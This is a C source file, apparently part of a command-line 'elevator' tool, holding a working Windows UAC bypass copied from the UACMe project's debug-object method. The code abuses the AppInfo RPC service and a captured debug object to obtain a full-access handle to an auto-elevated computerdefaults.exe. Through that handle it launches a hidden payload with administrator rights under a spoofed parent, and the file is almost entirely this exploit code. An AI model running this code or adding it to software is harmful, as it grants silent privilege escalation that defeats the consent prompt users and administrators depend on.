/*******************************************************************************
*
*  UAC bypass core.
*
*  Copied from UACMe - https://github.com/hfiref0x/UACME
*
*    (C) COPYRIGHT AUTHORS, 2017 - 2025, UACMe Project.
*
*  Method 59 "RAiLaunchAdminProcess and DebugObject" (autor: James Forshaw),
*  the very same code that backs Akagi's MethodDebugObject:
*
*    ucmDebugObjectMethod          Source/Akagi/methods/tyranid.c
*    ucmxCreateProcessFromParent   Source/Akagi/methods/tyranid.c
*    AicLaunchAdminProcess         Source/Akagi/aic.c
*    supGetProcessDebugObject      Source/Akagi/sup.c
*    supCreateBindingHandle        Source/Akagi/sup.c
*    appinfo RPC client stubs      Source/Akagi/appinfo/{x64,x86-32}
*
*  Redistribution and use in source and binary forms, with or without
*  modification, are permitted provided that the conditions of the UACMe
*  license are met (BSD 2-clause, see the UACMe LICENSE.md).
*
*  Local deviations from the original, all of them cosmetic:
*
*    - g_ctx->szSystemDirectory / szSystemRoot replaced with
*      GetSystemDirectoryW / GetWindowsDirectoryW.
*    - supHeapAlloc/supHeapFree replaced with GetProcessHeap wrappers.
*    - supSetGlobalCompletionEvent (UACMe console glue) dropped.
*    - The payload is created with SW_HIDE so that the broker's console never
*      flashes, and its PROCESS_INFORMATION is handed back to the caller so
*      that the launcher can wait for the broker to exit.
*    - ucmxCreateProcessFromParent no longer re-tests GetLastError() after a
*      successful CreateProcess; in the original that could launch the payload
*      a second time when a previous call had left ERROR_INSUFFICIENT_BUFFER
*      behind.
*
*  THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
*  ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
*  TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
*  PARTICULAR PURPOSE.
*
*******************************************************************************/

#include <stdio.h>
#include <wchar.h>

#include "cli-elevator.h"

#ifdef _WIN64
#include "appinfo/x64/appinfo64.h"
#else
#include "appinfo/x86-32/appinfo32.h"
#endif

#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

#define T_DEFAULT_DESKTOP       L"WinSta0\\Default"
#define COMPUTERDEFAULTS_EXE    L"computerdefaults.exe"
#define WINVER_EXE              L"winver.exe"

/* RPC interface GUID of the AppInfo LaunchAdminProcess service endpoint */
#define APPINFO_RPC             L"201ef99a-7fa0-444c-9399-19ba84f12a1a"

/*
* CliHeapAlloc / CliHeapFree
*
* Purpose:
*
* Heap wrappers, stand in for supHeapAlloc/supHeapFree.
*
*/
static PVOID CliHeapAlloc(
    SIZE_T Size)
{
    return HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, Size);
}

static VOID CliHeapFree(
    PVOID Memory)
{
    if (Memory)
        HeapFree(GetProcessHeap(), 0, Memory);
}

/*
* MIDL_user_allocate / MIDL_user_free
*
* Purpose:
*
* NDR allocator callbacks required by the generated appinfo client stubs.
*
*/
void __RPC_FAR *__RPC_USER MIDL_user_allocate(
    size_t size)
{
    return (void __RPC_FAR *)CliHeapAlloc(size);
}

void __RPC_USER MIDL_user_free(
    void __RPC_FAR *p)
{
    CliHeapFree(p);
}

/*
* CliCreateBindingHandle
*
* Purpose:
*
* Bind handle to the AppInfo RPC interface (supCreateBindingHandle).
*
*/
static RPC_STATUS CliCreateBindingHandle(
    RPC_WSTR RpcInterfaceUuid,
    RPC_BINDING_HANDLE *BindingHandle)
{
    RPC_STATUS status = RPC_S_INTERNAL_ERROR;
    RPC_SECURITY_QOS_V3 sqos;
    RPC_WSTR StringBinding = NULL;
    RPC_BINDING_HANDLE Binding = NULL;
    PSID LocalSystemSid = NULL;
    DWORD cbSid = SECURITY_MAX_SID_SIZE;

    if (BindingHandle)
        *BindingHandle = NULL;

    RtlSecureZeroMemory(&sqos, sizeof(sqos));

    status = RpcStringBindingComposeW(RpcInterfaceUuid,
        TEXT("ncalrpc"),
        NULL,
        NULL,
        NULL,
        &StringBinding);

    if (status == RPC_S_OK) {

        status = RpcBindingFromStringBindingW(StringBinding, &Binding);
        RpcStringFreeW(&StringBinding);

        if (status == RPC_S_OK) {

            LocalSystemSid = LocalAlloc(LPTR, cbSid);
            if (LocalSystemSid) {
                if (CreateWellKnownSid(WinLocalSystemSid, NULL, LocalSystemSid, &cbSid)) {

                    sqos.Version = 3;
                    sqos.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;
                    sqos.Capabilities = RPC_C_QOS_CAPABILITIES_MUTUAL_AUTH;
                    sqos.IdentityTracking = 0;
                    sqos.Sid = LocalSystemSid;

                    status = RpcBindingSetAuthInfoExW(Binding,
                        NULL,
                        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                        RPC_C_AUTHN_WINNT,
                        0,
                        0,
                        (RPC_SECURITY_QOS *)&sqos);

                    if (status == RPC_S_OK) {
                        *BindingHandle = Binding;
                        Binding = NULL;
                    }
                }
                else {
                    status = GetLastError();
                }
                LocalFree(LocalSystemSid);
            }
            else {
                status = ERROR_NOT_ENOUGH_MEMORY;
            }
        }
    }

    if (Binding)
        RpcBindingFree(&Binding);

    return status;
}

/*
* CliLaunchAdminProcess
*
* Purpose:
*
* Create process by talking to APPINFO via RPC (AicLaunchAdminProcess).
*
*/
static BOOLEAN CliLaunchAdminProcess(
    LPWSTR ExecutablePath,
    LPWSTR CommandLine,
    DWORD StartFlags,
    DWORD CreationFlags,
    LPWSTR CurrentDirectory,
    LPWSTR WindowStation,
    HWND hWnd,
    DWORD Timeout,
    DWORD ShowFlags,
    PROCESS_INFORMATION *ProcessInformation)
{
    BOOLEAN bResult = FALSE;
    RPC_BINDING_HANDLE rpcHandle;
    RPC_ASYNC_STATE asyncState;
    APP_PROCESS_INFORMATION procInfo;
    APP_STARTUP_INFO appStartup;
    RPC_STATUS status;
    VOID *Reply = NULL;

    LONG elevationType = 0;

    if (ProcessInformation) {
        ProcessInformation->hProcess = NULL;
        ProcessInformation->hThread = NULL;
        ProcessInformation->dwProcessId = 0;
        ProcessInformation->dwThreadId = 0;
    }

    RtlSecureZeroMemory(&procInfo, sizeof(procInfo));
    RtlSecureZeroMemory(&appStartup, sizeof(appStartup));

    appStartup.dwFlags = STARTF_USESHOWWINDOW;
    appStartup.wShowWindow = (SHORT)ShowFlags;

    RtlSecureZeroMemory(&asyncState, sizeof(RPC_ASYNC_STATE));

    if ((CliCreateBindingHandle(APPINFO_RPC, &rpcHandle) == RPC_S_OK)) {

        if (RpcAsyncInitializeHandle(&asyncState, sizeof(RPC_ASYNC_STATE)) == RPC_S_OK) {

            asyncState.NotificationType = RpcNotificationTypeEvent;
            asyncState.u.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);

            if (asyncState.u.hEvent) {

                __try {

                    RAiLaunchAdminProcess(&asyncState,
                        rpcHandle,
                        ExecutablePath,
                        CommandLine,
                        StartFlags,
                        CreationFlags,
                        CurrentDirectory,
                        WindowStation,
                        &appStartup,
                        (ULONG_PTR)hWnd,
                        Timeout,
                        &procInfo,
                        &elevationType);

                    if (WaitForSingleObject(asyncState.u.hEvent, INFINITE) == WAIT_FAILED)
                    {
                        RpcRaiseException(-1);
                    }

                    status = RpcAsyncCompleteCall(&asyncState, &Reply);
                    if (status == 0 && Reply == NULL) {

                        if (ProcessInformation) {
                            ProcessInformation->hProcess = (HANDLE)procInfo.ProcessHandle;
                            ProcessInformation->hThread = (HANDLE)procInfo.ThreadHandle;
                            ProcessInformation->dwProcessId = (DWORD)procInfo.ProcessId;
                            ProcessInformation->dwThreadId = (DWORD)procInfo.ThreadId;
                        }

                        bResult = TRUE;
                    }

                    CloseHandle(asyncState.u.hEvent);

                }
                __except (EXCEPTION_EXECUTE_HANDLER) {
                    SetLastError(RpcExceptionCode());
                    RpcBindingFree(&rpcHandle);
                    return FALSE;
                }
            }
        }

        RpcBindingFree(&rpcHandle);
    }

    return bResult;
}

/*
* CliGetProcessDebugObject
*
* Purpose:
*
* Reference process debug object (supGetProcessDebugObject).
*
*/
static NTSTATUS CliGetProcessDebugObject(
    HANDLE ProcessHandle,
    PHANDLE DebugObjectHandle)
{
    return NtQueryInformationProcess(
        ProcessHandle,
        ProcessDebugObjectHandle,
        DebugObjectHandle,
        sizeof(HANDLE),
        NULL);
}

/*
* CliCreateProcessFromParent
*
* Purpose:
*
* Create new process using parent process handle (ucmxCreateProcessFromParent).
*
* Payload is the broker command line. Its console is created hidden, the broker
* re-hides it on entry.
*
*/
static NTSTATUS CliCreateProcessFromParent(
    HANDLE ParentProcess,
    LPCWSTR Payload,
    PROCESS_INFORMATION *PayloadProcess)
{
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    SIZE_T size = 0x30;
    STARTUPINFOEX si;
    PROCESS_INFORMATION pi;
    WCHAR szSystemRoot[MAX_PATH];

    RtlSecureZeroMemory(&pi, sizeof(pi));
    RtlSecureZeroMemory(&si, sizeof(si));
    si.StartupInfo.cb = sizeof(STARTUPINFOEX);

    szSystemRoot[0] = 0;
    GetWindowsDirectoryW(szSystemRoot, MAX_PATH);

    for (;;) {

        if (size > 4096)
            break;

        si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)CliHeapAlloc(size);
        if (si.lpAttributeList == NULL)
            break;

        if (InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size)) {

            if (UpdateProcThreadAttribute(si.lpAttributeList, 0,
                PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &ParentProcess, sizeof(HANDLE), NULL, NULL))
            {
                si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
                si.StartupInfo.wShowWindow = SW_HIDE;

                if (CreateProcessW(NULL,
                    (LPWSTR)Payload,
                    NULL,
                    NULL,
                    FALSE,
                    CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT | EXTENDED_STARTUPINFO_PRESENT,
                    NULL,
                    szSystemRoot,
                    (LPSTARTUPINFO)&si,
                    &pi))
                {
                    status = STATUS_SUCCESS;

                    if (PayloadProcess) {
                        *PayloadProcess = pi;
                    }
                    else {
                        CloseHandle(pi.hThread);
                        CloseHandle(pi.hProcess);
                    }
                }
            }

            DeleteProcThreadAttributeList(si.lpAttributeList);
            CliHeapFree(si.lpAttributeList);
            break;
        }

        CliHeapFree(si.lpAttributeList);
        si.lpAttributeList = NULL;

        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
            break;
    }

    return status;
}

/*
* CliElevateAndLaunch
*
* Purpose:
*
* Bypass UAC by direct RPC call to APPINFO and DebugObject use
* (ucmDebugObjectMethod).
*
* On success the returned PROCESS_INFORMATION describes the elevated broker.
*
*/
BOOL CliElevateAndLaunch(
    LPCWSTR BrokerCommandLine,
    PROCESS_INFORMATION *Payload)
{
    BOOL debugObjectSet = FALSE;
    NTSTATUS status = STATUS_ACCESS_DENIED;
    HANDLE dbgHandle = NULL, dbgProcessHandle = NULL, dupHandle = NULL;
    PROCESS_INFORMATION procInfo;
    PROCESS_INFORMATION payloadInfo;
    DEBUG_EVENT dbgEvent;
    WCHAR szProcess[MAX_PATH * 2];
    WCHAR szSystemDirectory[MAX_PATH];
    WCHAR szSystemRoot[MAX_PATH];
    BOOL bResult = FALSE;

    if (Payload) {
        RtlSecureZeroMemory(Payload, sizeof(*Payload));
        Payload->hProcess = NULL;
        Payload->hThread = NULL;
    }

    RtlSecureZeroMemory(&procInfo, sizeof(procInfo));
    RtlSecureZeroMemory(&payloadInfo, sizeof(payloadInfo));
    RtlSecureZeroMemory(&dbgEvent, sizeof(dbgEvent));

    szSystemDirectory[0] = 0;
    szSystemRoot[0] = 0;
    GetSystemDirectoryW(szSystemDirectory, MAX_PATH);
    GetWindowsDirectoryW(szSystemRoot, MAX_PATH);

    do {

        //
        // Spawn initial non elevated victim process under debug.
        //
        _snwprintf_s(szProcess, MAX_PATH * 2, _TRUNCATE,
            L"%s\\%s", szSystemDirectory, WINVER_EXE);

        CliTrace(L"bypass: launching %s", szProcess);

        if (!CliLaunchAdminProcess(szProcess,
            szProcess,
            0,
            CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS,
            szSystemRoot,
            T_DEFAULT_DESKTOP,
            NULL,
            INFINITE,
            SW_HIDE,
            &procInfo))
        {
            status = STATUS_UNSUCCESSFUL;
            break;
        }

        //
        // Capture debug object handle.
        //
        status = CliGetProcessDebugObject(procInfo.hProcess, &dbgHandle);
        CliTrace(L"bypass: debug object status 0x%08X", (unsigned)status);

        if (!NT_SUCCESS(status)) {
            TerminateProcess(procInfo.hProcess, 0);
            CloseHandle(procInfo.hThread);
            CloseHandle(procInfo.hProcess);
            procInfo.hThread = NULL;
            procInfo.hProcess = NULL;
            break;
        }

        //
        // Detach debug and kill non elevated victim process.
        //
        NtRemoveProcessDebug(procInfo.hProcess, dbgHandle);
        TerminateProcess(procInfo.hProcess, 0);
        CloseHandle(procInfo.hThread);
        CloseHandle(procInfo.hProcess);
        procInfo.hThread = NULL;
        procInfo.hProcess = NULL;

        //
        // Spawn elevated victim under debug.
        //
        _snwprintf_s(szProcess, MAX_PATH * 2, _TRUNCATE,
            L"%s\\%s", szSystemDirectory, COMPUTERDEFAULTS_EXE);

        RtlSecureZeroMemory(&procInfo, sizeof(procInfo));
        RtlSecureZeroMemory(&dbgEvent, sizeof(dbgEvent));

        CliTrace(L"bypass: launching %s elevated", szProcess);

        if (!CliLaunchAdminProcess(szProcess,
            szProcess,
            1,
            CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS,
            szSystemRoot,
            T_DEFAULT_DESKTOP,
            NULL,
            INFINITE,
            SW_HIDE,
            &procInfo))
        {
            status = STATUS_UNSUCCESSFUL;
            break;
        }

        //
        // Update thread TEB with debug object handle to receive debug events.
        //
        DbgUiSetThreadDebugObject(dbgHandle);
        debugObjectSet = TRUE;

        //
        // Debugger wait cycle.
        //
        while (1) {
            if (!WaitForDebugEvent(&dbgEvent, INFINITE))
                break;

            if (dbgEvent.dwDebugEventCode == CREATE_PROCESS_DEBUG_EVENT) {
                dbgProcessHandle = dbgEvent.u.CreateProcessInfo.hProcess;
            }

            if (dbgProcessHandle)
                break;

            ContinueDebugEvent(dbgEvent.dwProcessId, dbgEvent.dwThreadId, DBG_CONTINUE);
        }

        if (dbgProcessHandle) {
            //
            // Create new handle from captured with PROCESS_ALL_ACCESS.
            //
            status = NtDuplicateObject(dbgProcessHandle,
                NtCurrentProcess(),
                NtCurrentProcess(),
                &dupHandle,
                PROCESS_ALL_ACCESS,
                0,
                0);

            if (NT_SUCCESS(status)) {
                //
                // Run new process with parent set to duplicated process handle.
                //
                CliTrace(L"bypass: starting payload from spoofed parent");
                status = CliCreateProcessFromParent(dupHandle, BrokerCommandLine, &payloadInfo);
                CliTrace(L"bypass: payload status 0x%08X", (unsigned)status);
                NtClose(dupHandle);
                dupHandle = NULL;

                if (NT_SUCCESS(status))
                    bResult = TRUE;
            }
        }

    } while (FALSE);

    //
    // Cleanup section.
    //
    if (debugObjectSet) {
#pragma warning(push)
#pragma warning(disable: 6387)
        DbgUiSetThreadDebugObject(NULL);
#pragma warning(pop)
    }

    if (dbgHandle) {
        NtClose(dbgHandle);
    }

    if (dbgProcessHandle) {
        CloseHandle(dbgProcessHandle);
    }

    // Release victim process if still open.
    //
    // This marks the elevated victim terminated, and that is as far as it goes:
    // AppInfo started it with DEBUG_PROCESS and keeps the debug object it was
    // created under, so the victim stays frozen on a debug event nobody will
    // process and the kernel never releases the process object. What is left in
    // the process list is a ComputerDefaults.exe with no handles, no CPU and a
    // single suspended thread. Detaching (NtRemoveProcessDebug) is refused - the
    // handle AppInfo gave us carries no debug access - and draining the events
    // changes nothing. Inherited UACMe behaviour, see README.
    //
    if (procInfo.hThread) {
        CloseHandle(procInfo.hThread);
    }

    if (procInfo.hProcess) {
        TerminateProcess(procInfo.hProcess, 0);
        CloseHandle(procInfo.hProcess);
    }

    if (bResult) {
        if (Payload)
            *Payload = payloadInfo;
        else {
            CloseHandle(payloadInfo.hThread);
            CloseHandle(payloadInfo.hProcess);
        }
    }

    return bResult;
}
